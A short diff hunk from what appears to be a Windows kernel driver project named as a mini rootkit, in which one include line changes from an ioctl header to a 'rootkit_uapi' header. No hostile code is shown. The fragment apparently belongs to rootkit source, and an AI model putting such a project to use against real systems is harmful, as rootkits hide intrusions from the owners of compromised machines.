@@ -4,7 +4,7 @@
 // Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
 #include <minwindef.h>
 #include "mini_rootkit.h"
-#include "shared/ioctl.h"
+#include "shared/rootkit_uapi.h"
 #include "structures.h"
 #include "utils.h"
 
